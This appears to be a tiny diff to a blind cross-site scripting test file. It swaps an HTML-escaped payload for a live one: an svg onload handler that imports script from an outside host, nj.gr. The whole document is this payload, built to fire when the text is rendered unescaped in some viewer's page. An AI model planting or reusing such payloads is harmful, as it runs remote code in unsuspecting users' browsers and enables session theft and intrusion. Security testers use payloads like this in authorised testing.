@@ -1,2 +1,2 @@
 # bxss-test
-'">&lt;svg onload=import(`//nj.gr`)>
+'"><svg onload=import(/\nj.gr/)>
